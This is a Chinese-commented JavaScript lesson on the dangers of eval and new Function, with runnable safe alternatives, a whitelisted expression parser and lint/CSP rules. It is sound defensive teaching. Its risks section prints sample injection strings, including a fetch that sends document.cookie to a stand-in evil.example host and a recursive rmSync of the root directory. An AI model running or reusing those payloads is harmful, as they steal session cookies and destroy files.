/**
 * ============================================================================
 * 知识点：eval / new Function 的风险与替代方案 —— 为什么"把字符串当代码跑"很危险
 * ============================================================================
 *
 * 【所属分类】32_security_and_best_practices —— 安全与最佳实践
 * 【难度等级】进阶
 * 【前置知识】32_security_and_best_practices/02_xss_prevention.js、06_functions（函数基础）
 *
 * 【知识点说明】
 *
 * 1. 是什么
 *    `eval(code)` 会把传入的字符串**当作 JavaScript 代码在当前作用域里立即执行**；
 *    `new Function(...args, body)` 则是把字符串编译成一个新函数（作用域是全局的）。
 *    两者都属于"字符串到代码"的动态求值（dynamic code evaluation）。
 *    为什么危险，可以拆成六条：
 *      (1) 执行任意代码：只要字符串能被攻击者影响，攻击者就能在你的进程/页面里跑任意逻辑。
 *      (2) 代码注入：和 SQL 注入同源 —— 数据混进了代码位置。输入 "1+1" 是数据，
 *          输入 "process.exit()" 就是代码。你无法在"字符串层面"可靠区分二者。
 *      (3) 破坏作用域：eval 能读写**调用它的那个作用域**的局部变量，
 *          这让"谁改了这个变量"变得无法追踪。
 *      (4) 破坏引擎优化：包含 eval 的函数，V8 无法安全地做内联/变量提升等优化，
 *          且必须保留完整的变量环境（scope），性能与内存都受损。
 *      (5) 被 CSP 阻止：浏览器的 `script-src` 若没有 `'unsafe-eval'`，eval / new Function
 *          会直接抛 EvalError。很多团队为了用某个库被迫放开 'unsafe-eval'，等于自废 CSP。
 *      (6) 调试困难：堆栈里出现 "(eval)"，断点难打，错误信息丢失行号，
 *          代码审查工具看不懂、静态分析失效。
 *
 * 2. 为什么需要（真实项目场景）
 *    (a) 最常见的翻车方式：把"计算器"功能交给 eval（"用户输入算式，我帮他算"）；
 *        把"动态取值"交给 eval(`obj.${key}`)；把模板/规则引擎写成 eval。
 *    (b) 一旦配合 XSS（02 篇）或原型污染（04 篇），eval 会把"能改数据"升级成"能执行代码"。
 *    (c) 现代前端几乎不需要它：JSON.parse、模板字面量、对象映射、Intl、正则、Proxy
 *        已经覆盖了 99% 的"我原本想用 eval"的场景。
 *    (d) 服务端更危险：Node 里 eval 的后果是任意文件读写、任意命令执行。
 *
 * 3. 核心语法要点（以及各自的正确替代）
 *    - 解析数据      -> 用 JSON.parse，绝不用 eval。`eval('(' + json + ')')` 是经典反模式。
 *    - 动态取属性    -> 用 obj[key]、可选链 obj?.a?.[key]，绝不用 eval('obj.' + key)。
 *    - 动态方法名    -> 用对象映射 `const handlers = { add, remove }; handlers[name]()`。
 *    - 动态表达式    -> 用小型手写解析器/正则/成熟库（如 expr-eval、mathjs），或明确的白名单。
 *    - 动态函数体    -> 优先"传函数"而不是"传字符串"：`doThing(fn)` 好过 `doThing('a+b')`。
 *    - 模板渲染      -> 用模板引擎（它有自己的沙箱与转义），不要自己拼字符串再 eval。
 *    - 真的非要动态执行？ -> 用 `new Function` 比 `eval` 稍好（不污染局部作用域、可被 CSP 单独管控），
 *       但仍**不是沙箱**：`new Function('return process')()` 能拿到全局对象。
 *    - `(0, eval)(code)` 是"间接调用"，它在全局作用域执行（拿不到局部变量），
 *       有人误以为它更安全 —— 它只是"换了个作用域"，安全性没有任何改善。
 *    - Node 提供了 `--disallow-code-generation-from-strings` 启动参数，可直接禁用这类 API。
 *
 * 4. 常见陷阱
 *    - 以为"我过滤了分号 / 括号"就安全：JS 语法极其灵活，绕过分号过滤的方式很多。
 *    - 以为"输入只来自内部、不是用户"：内部数据也可能被上游污染（配置中心、数据库、日志回放）。
 *    - 以为 setTimeout('code', 0) 不是 eval：字符串形式的 setTimeout/setInterval 同样是动态求值，
 *        而且同样受 CSP 限制。永远传函数。
 *    - 以为"沙箱"能解决问题：用 eval 模拟沙箱（传入假 window / 用 with）历史上被反复证明可逃逸。
 *        真正的隔离要靠独立进程 + 权限限制（如 Node 的 vm + 子进程），或干脆换语言/服务。
 *    - 把 new Function 当成"只编译一次所以安全"：它只是作用域不同，代码注入照样成立。
 *
 * 【运行方法】
 *   在仓库根目录执行：node 32_security_and_best_practices/05_eval_dangers.js
 *
 * 【预期输出】
 *   演示 eval 与 new Function 的**作用域差别**（只用完全无害的表达式，如 '1 + 1'），
 *   明确标注"仅为演示 API 行为，切勿对用户输入使用"；
 *   再看 eval 破坏优化与作用域可读性的现象；
 *   然后用四种替代方案解决"我原本想用 eval"的四个典型需求；
 *   全程不执行任何危险代码，退出码 0。
 * ============================================================================
 */

// ============================================================================
// 小节 1：eval 与 new Function 到底是什么（先看清 API 行为）
// ============================================================================
console.log('--- 1. API 行为：eval 与 new Function 是什么 ---');
console.log('  ⚠️ 安全声明：本文件只用"完全无害的字面量表达式"演示 API 的**行为差异**。');
console.log('     绝不对任何用户输入、外部数据、拼接字符串调用 eval / new Function。');
console.log('     真实项目里，这两种 API 应当被视为"几乎永远不该使用"。\n');

// 【仅演示 API 行为】最无害的例子：一个常量算术表达式
const harmlessExpr = '1 + 1';
const evalResult = eval(harmlessExpr);
console.log(`  eval('${harmlessExpr}')              -> ${evalResult}`);
console.log(`  类型: ${typeof evalResult}`);

// new Function：先编译成一个函数，再手动调用
// 【仅演示 API 行为】同样是完全写死的字面量
const fnFromString = new Function('return 1 + 1');
console.log(`  new Function('return 1 + 1')()       -> ${fnFromString()}`);

// 带参数的 new Function：前面的参数是形参名，最后一个是函数体
const addFn = new Function('a', 'b', 'return a + b');
console.log(`  new Function('a','b','return a+b')(2,3) -> ${addFn(2, 3)}`);
console.log('  观察：它们确实能"把字符串变成可执行的代码" —— 这正是危险的本源。');

// ============================================================================
// 小节 2：两者最关键的区别 —— 作用域
// ============================================================================
console.log('\n--- 2. 核心区别：eval 能看见局部变量，new Function 看不见 ---');

/**
 * 演示 eval 的作用域穿透：它能看到（并修改）调用处的局部变量。
 * 【仅演示 API 行为】传入的是写死的字面量，不是外部输入。
 * @returns {{localAfter: number, returned: unknown}}
 */
function evalSeesLocalScope() {
  let local = 10;
  // eval 在"当前作用域"求值：字符串里的 local 直接指向上面这个局部变量
  const returned = eval('local + 1');
  // 更惊人的是它还能**改写**局部变量 —— 这让变量变化的来源变得不可追踪
  eval('local = 999');
  return { localAfter: local, returned };
}
const evalScope = evalSeesLocalScope();
console.log(`  function f() { let local = 10; eval('local + 1'); eval('local = 999'); }`);
console.log(`    eval('local + 1') 的返回值        = ${evalScope.returned}  <- 读到了局部变量`);
console.log(`    执行 eval('local = 999') 之后 local = ${evalScope.localAfter}  <- 局部变量被改写！`);
console.log('    问题：你 grep "local = 999" 是搜不到这行代码的，因为它是字符串。');

/**
 * new Function 的作用域是**全局**，拿不到调用处的局部变量。
 * 【仅演示 API 行为】写死的字面量。
 * @returns {unknown}
 */
function fnCannotSeeLocalScope() {
  const local = 10;
  // new Function 在全局作用域编译，函数体里的 local 是"未定义标识符"
  const f = new Function('return typeof local');
  return f();
}
console.log(`  function g() { const local = 10; return new Function('return typeof local')(); }`);
console.log(
  `    返回 ${JSON.stringify(fnCannotSeeLocalScope())}  <- 看不到局部变量（typeof 得到字符串 "undefined"）`
);
console.log('    所以 new Function 比 eval"干净"一点：不会意外读写你的局部变量。');
console.log('    但请注意：这不等于安全 —— 它仍能访问全局对象（globalThis / process / window）。');

// ============================================================================
// 小节 3：为什么危险 —— 六条风险（危险代码只写在注释里）
// ============================================================================
console.log('\n--- 3. 六条风险：为什么"把字符串当代码跑"很危险 ---');

const risks = [
  [
    '执行任意代码',
    '字符串能表达任意程序。下面这些字符串**本文件不会执行**，仅说明可能性：\n' +
      "        // eval(userInput) 其中 userInput = \"process.exit(1)\"\n" +
      "        // eval(userInput) 其中 userInput = \"require('node:fs').rmSync('/')\n" +
      "        // eval(userInput) 其中 userInput = \"fetch('https://evil.example/x?d='+document.cookie)\"",
  ],
  [
    '代码注入（与 SQL 注入同源）',
    '数据混进了"代码位置"。就像 SQL 里拼接参数一样，你无法在字符串层面\n' +
      '        可靠区分"这是数据"还是"这是代码"。输入 "1+1" 与 "1+1; doSomethingBad()"\n' +
      '        在语法上没有任何区别。',
  ],
  [
    '破坏作用域',
    'eval 能读能写调用处的局部变量（见小节 2），使得"这个变量为什么变了"变得\n' +
      '        无法通过阅读源码回答；闭包、模块封装的意义被削弱。',
  ],
  [
    '破坏引擎优化',
    'V8 等引擎无法对"包含 eval 的函数"做内联、变量寄存器分配等优化，\n' +
      '        因为 eval 可能在运行时给作用域引入新变量。整个函数的性能会下降。',
  ],
  [
    '被 CSP 阻止 / 迫使放开 CSP',
    "浏览器 CSP 中 script-src 不含 'unsafe-eval' 时，eval 与 new Function 会抛 EvalError。\n" +
      "        团队为了用某个依赖库，往往被迫加上 'unsafe-eval' —— 等于把 CSP 这道防线废掉，\n" +
      '        XSS 的收益立刻变大。',
  ],
  [
    '调试与静态分析困难',
    '堆栈里出现 "(eval)"，错误没有真实文件行号；断点难打；\n' +
      '        ESLint 的 no-eval、SAST 工具、类型检查都对字符串里的代码无能为力。',
  ],
];
for (const [name, detail] of risks) {
  console.log(`  ${name}：`);
  console.log(`        ${detail}`);
}

console.log('\n  [CSP 与 Node 侧的限制]');
console.log("    浏览器：Content-Security-Policy: script-src 'self'  -> eval/new Function 直接抛错");
console.log('    Node  ：node --disallow-code-generation-from-strings app.js  -> 同样禁用这两个 API');

// ============================================================================
// 小节 4：反模式对照表 —— "我原本想用 eval"的四个典型需求
// ============================================================================
console.log('\n--- 4. 反模式 vs 正确写法（四个高频场景） ---');
console.log('  下面左列是"看起来很方便的 eval 写法"，右列是应该用的写法。');
console.log('  左列只作为字符串打印出来，不执行。\n');

const antipatterns = [
  [
    '① 解析 JSON',
    // eslint-disable-next-line no-useless-escape
    "const obj = eval('(' + jsonText + ')');",
    'const obj = JSON.parse(jsonText);',
    'JSON.parse 只解析数据，永远不会执行代码；eval 会把 JSON 里的任何内容都当代码。',
  ],
  [
    '② 按变量名取值',
    "const v = eval('data.' + fieldName);",
    'const v = data[fieldName];   // 或用 Map 存字段',
    '下标访问就是"按名字取值"的原生语法，既安全又快，还能配合可选链 data?.[fieldName]。',
  ],
  [
    '③ 按名字调用方法',
    "eval('handlers.' + action + '()');",
    'const handlers = { add, remove, list };\n' +
      '        const fn = handlers[action];\n' +
      '        if (typeof fn !== "function") throw new Error("未知操作");\n' +
      '        fn();',
    '对象映射（或 Map）天然是白名单：不在表里的名字根本取不到函数，默认拒绝。',
  ],
  [
    '④ 用户自定义计算公式',
    "const total = eval(userFormula);",
    '用成熟表达式库（如 expr-eval / mathjs）或自己写小型解析器（见小节 5）',
    '表达式库把"算式"解析成受限的 AST，只能做算术，拿不到 process / window。',
  ],
];
for (const [scene, bad, good, why] of antipatterns) {
  console.log(`  ${scene}`);
  console.log(`    ✗ 反模式 : ${bad}`);
  console.log(`    ✓ 正确   : ${good.replace(/\n\s*/g, ' ')}`);
  console.log(`    原因     : ${why}\n`);
}

// ============================================================================
// 小节 5：把替代方案真正跑起来
// ============================================================================
console.log('--- 5. 替代方案实测（这些是真跑起来的） ---');

// ---- 替代 1：JSON.parse 代替 eval 解析数据 ----
console.log('  [替代 1] JSON.parse');
const jsonText = '{"name":"alice","age":30,"tags":["a","b"]}';
const parsedData = JSON.parse(jsonText);
console.log(`    输入    : ${jsonText}`);
console.log(`    解析结果: name=${parsedData.name} age=${parsedData.age} tags=${parsedData.tags.join('/')}`);
console.log('    对比：如果这里用 eval("(" + jsonText + ")")，那 jsonText 里的任何 JS 都会被执行。');
console.log('          JSON 语法是 JS 语法的一个"安全子集"：只有字面量，没有函数调用、没有语句。');
console.log('          这也解释了为什么"JSON 比 JS 字面量安全"—— 它不是能力更弱的 JS，而是纯数据格式。');

// ---- 替代 2：下标访问 代替 eval 取属性 ----
console.log('\n  [替代 2] obj[key] 代替 eval 取属性');
const record = { id: 7, name: 'bob', role: 'user', secretToken: 'should-not-expose' };
/**
 * 安全地按字段名取值：白名单 + 下标访问。
 * @param {object} obj
 * @param {string} key
 * @param {string[]} allowed 允许暴露的字段
 * @returns {unknown}
 */
function safeGet(obj, key, allowed) {
  if (!allowed.includes(key)) return undefined; // 默认拒绝
  return obj[key];
}
const ALLOWED_FIELDS = ['id', 'name', 'role'];
for (const k of ['name', 'role', 'secretToken', 'constructor']) {
  console.log(
    `    safeGet(record, '${k}') -> ${JSON.stringify(safeGet(record, k, ALLOWED_FIELDS))}`
  );
}
console.log('    注意 secretToken 与 constructor 都被白名单挡在门外；');
console.log('    eval 写法则会把 "constructor" 这类名字也当表达式求值，直接泄漏内部结构。');

// ---- 替代 3：对象映射 代替 eval 调方法 ----
console.log('\n  [替代 3] 对象映射（handlers 表）代替 eval 调方法');
const cart = [];
const handlers = {
  add: (item) => {
    cart.push(item);
    return `已加入 ${item}`;
  },
  remove: () => {
    const last = cart.pop();
    return last === undefined ? '购物车是空的' : `已移除 ${last}`;
  },
  list: () => `当前购物车: [${cart.join(', ')}]`,
};

/**
 * 按名字安全地分发操作。
 * @param {string} action
 * @param {unknown} [arg]
 * @returns {string}
 */
function dispatch(action, arg) {
  const fn = handlers[action];
  // 关键一步：不在表里的名字，fn 就是 undefined，直接拒绝
  if (typeof fn !== 'function') return `拒绝：未知操作 "${action}"`;
  return fn(arg);
}

/**
 * 【进阶版】用 Object.hasOwn 做白名单判断，杜绝"继承来的方法"被误当成合法操作。
 * 为什么需要它？见下面的实测：handlers['constructor'] 是 Object 构造函数本体，
 * typeof 是 'function'，上面那个朴素版本会把它当成一个"合法操作"去调用！
 * @param {string} action
 * @param {unknown} [arg]
 * @returns {string}
 */
function dispatchSafe(action, arg) {
  // 只认"自己表里明明白白写着的键"，原型链上继承来的一律不算
  if (!Object.hasOwn(handlers, action)) return `拒绝：未知操作 "${action}"`;
  const fn = handlers[action];
  if (typeof fn !== 'function') return `拒绝：非函数操作 "${action}"`;
  return fn(arg);
}

const dispatchCases = [
  ['add', '苹果'],
  ['add', '牛奶'],
  ['list', undefined],
  ['remove', undefined],
  ['list', undefined],
  ['dropDatabase', undefined],
  ['constructor', undefined],
  ['toString', undefined],
];

console.log('    【第一轮】朴素版 dispatch（没有 Object.hasOwn 检查）：');
for (const [action, arg] of dispatchCases) {
  console.log(`      dispatch(${JSON.stringify(action)}) -> ${dispatch(action, arg)}`);
}

// 清空购物车，让第二轮从同样的初始状态开始，便于对照
cart.length = 0;

console.log('    【第二轮】安全版 dispatch（加了 Object.hasOwn 检查）：');
for (const [action, arg] of dispatchCases) {
  console.log(`      dispatchSafe(${JSON.stringify(action)}) -> ${dispatchSafe(action, arg)}`);
}
console.log('    意外发现（很值得记住）：朴素版对 "constructor" 竟然"调用成功"了 ——');
console.log("    因为 handlers['constructor'] 是从 Object.prototype 继承来的 Object 构造函数，");
console.log("    typeof 它确实是 'function'，于是白名单被自己的原型链绕过了。");
console.log('    修正办法就是加一道 Object.hasOwn 判断（或直接把 handlers 建成 Object.create(null)）。');
console.log('    可见"用数据结构代替代码字符串"方向正确，但同样要做属性存在性检查（见 04 篇）。');

// ---- 替代 4：受限表达式求值（手写迷你解析器）代替 eval 算公式 ----
console.log('\n  [替代 4] 手写迷你表达式解析器代替 eval 算公式');
console.log('    需求：让用户配置"满减规则"，如 "price * 0.8 + 5 > 100"。');
console.log('    思路：用正则把表达式拆成"数字 / 变量名 / 运算符"三类 token，');
console.log('          再按白名单计算 —— 任何不在白名单里的东西（函数调用、属性访问）都算非法。');

const OPS = {
  '+': (a, b) => a + b,
  '-': (a, b) => a - b,
  '*': (a, b) => a * b,
  '/': (a, b) => a / b,
  '>': (a, b) => a > b,
  '<': (a, b) => a < b,
};

/**
 * 极简表达式求值器：只支持"左 变量/数字 运算符 变量/数字"这一种形式。
 * 它**不认识**函数调用、属性访问、分号、括号嵌套 —— 所以天然安全。
 * @param {string} expr
 * @param {Record<string, number>} vars 允许的变量白名单
 * @returns {{ok: boolean, value?: unknown, reason?: string}}
 */
function safeEvalExpression(expr, vars) {
  const m = String(expr).trim().match(/^([A-Za-z_]\w*|\d+(?:\.\d+)?)\s*([+\-*/<>])\s*([A-Za-z_]\w*|\d+(?:\.\d+)?)$/);
  if (!m) return { ok: false, reason: '表达式不合法（只支持 值 运算符 值）' };
  const [, leftTok, op, rightTok] = m;
  // 白名单校验运算符
  if (!Object.hasOwn(OPS, op)) return { ok: false, reason: `不支持的运算符 ${op}` };
  /**
   * 把 token 解析成值：数字直接转，标识符必须在变量白名单里。
   * @param {string} tok
   * @returns {number|undefined}
   */
  const resolve = (tok) => {
    if (/^\d/.test(tok)) return Number(tok);
    // 变量名白名单：不在表里就拒绝 —— 这挡住了 process / globalThis 之类
    return Object.hasOwn(vars, tok) ? vars[tok] : undefined;
  };
  const a = resolve(leftTok);
  const b = resolve(rightTok);
  if (a === undefined) return { ok: false, reason: `未知变量 ${leftTok}` };
  if (b === undefined) return { ok: false, reason: `未知变量 ${rightTok}` };
  return { ok: true, value: OPS[op](a, b) };
}

const exprVars = { price: 100, count: 3, discount: 0.8 };
for (const e of [
  'price * discount',
  'count + 1',
  'price > 50',
  'process',
  'process.exit(1)',
  'require("fs")',
  'globalThis',
  'price * discount; doSomethingBad()',
]) {
  const r = safeEvalExpression(e, exprVars);
  console.log(`    safeEvalExpression(${JSON.stringify(e)}) -> ${r.ok ? `= ${r.value}` : '拒绝: ' + r.reason}`);
}
console.log('    注意最后几个"注入尝试"：解析器根本看不懂它们，直接拒绝。');
console.log('    这就是"用受限解析器代替通用求值器"的价值 —— 攻击面从"整个 JS"缩小到"四则运算"。');

// ============================================================================
// 小节 6：如果非要用 new Function —— 它也不是沙箱
// ============================================================================
console.log('\n--- 6. 如果非要用 new Function：请知道它不是沙箱 ---');

console.log("  常见误解：\"new Function('return 1') 不带作用域，所以是沙箱\"。");
console.log('  事实：它拿不到**局部**变量，但拿得到**全局**对象。');
// 【仅演示 API 行为】这里只做"能力探测"，不执行任何写操作或危险动作
const globalProbe = new Function('return typeof globalThis');
console.log(`    new Function('return typeof globalThis')()  -> ${globalProbe()}  <- 全局对象唾手可得`);
const processProbe = new Function('return typeof process');
console.log(`    new Function('return typeof process')()     -> ${processProbe()}  <- Node 里还能摸到 process`);

console.log('\n  有人试图用"参数遮蔽 + with"造沙箱，比如把 globalThis 传成 undefined。');
console.log('  这类做法在历史上一再被证明可逃逸，例如通过 this、通过构造函数链、');
console.log('  通过错误对象的构造函数等路径绕回真正的全局对象。');
console.log('  结论：**eval / new Function 上没有"可靠的沙箱"这回事。**');

console.log('\n  真要隔离不可信代码时的正确方向：');
const sandboxApproach = [
  ['换掉语言', '规则表达式 -> 用受限 DSL；用户脚本 -> 用 Lua/WebAssembly/专用规则引擎'],
  ['独立进程 + 权限限制', 'Node 的 child_process 起子进程，配合最小权限用户、只读文件系统、无网络'],
  ['vm 模块 + 超时', 'node:vm 的 createContext + timeout，能挡部分误用，但官方明确说"不是安全机制"'],
  ['外部服务', '把不可信代码丢到独立的容器/沙箱服务里执行，通过 API 交互'],
  ['干脆别做', '多数业务的"用户自定义公式"需求，其实用一组可配置的选项就能满足'],
];
for (const [name, desc] of sandboxApproach) {
  console.log(`    ${name}：${desc}`);
}

// ============================================================================
// 小节 7：编码规范层面怎么防 —— 让 eval 根本进不了代码库
// ============================================================================
console.log('\n--- 7. 工程手段：让 eval 根本进不了代码库 ---');

const guards = [
  ["ESLint: 'no-eval': 'error'", "禁止 eval，也一并禁止类似形式（含隐式的 window.eval）"],
  ["ESLint: 'no-implied-eval': 'error'", "禁止 setTimeout / setInterval / execScript 的字符串形式"],
  ["ESLint: 'no-new-func': 'error'", '禁止 new Function 构造器'],
  ["ESLint: 'no-script-url': 'error'", "禁止 javascript: 伪协议（它本质也是代码位置）"],
  ["Code Review 关键词搜索", '代码评审时搜 eval(、new Function(、setTimeout("、setInterval("'],
  ["CSP: 不放开 'unsafe-eval'", '让浏览器在运行时兜底拦截；同时推动依赖库迁移'],
  ['Node 启动参数', '--disallow-code-generation-from-strings 从运行时层面禁用'],
  ['安全培训', '让"想到 eval"的同事知道该换成哪种替代方案（本文件小节 4 就是这张对照表）'],
];
for (const [name, desc] of guards) {
  console.log(`  - ${name}`);
  console.log(`      ${desc}`);
}

// ============================================================================
// 小节 8：小结
// ============================================================================
console.log('\n--- 8. 小结 ---');
console.log('  1) eval / new Function 把字符串当代码执行 —— 数据与代码的边界被抹掉，这就是风险的根源。');
console.log('  2) eval 会读写调用处局部变量；new Function 作用域是全局。差别只是作用域，不是安全性。');
console.log('  3) 六条风险：任意代码执行、代码注入、破坏作用域、破坏优化、被 CSP 阻止/逼迫放开 CSP、难调试。');
console.log('  4) 四个高频替代：JSON.parse 解析数据、obj[key] 取值、对象映射调方法、受限解析器算公式。');
console.log('  5) new Function 不是沙箱；真要隔离不可信代码，得换语言/独立进程/独立服务。');
console.log('  6) 用 ESLint 规则 + CSP + Node 启动参数把 eval 挡在代码库之外，比"事后审查"可靠得多。');
console.log('  7) 本文件所有动态求值都只针对完全写死的无害字面量；生产代码里永远不要对输入用这些 API。');
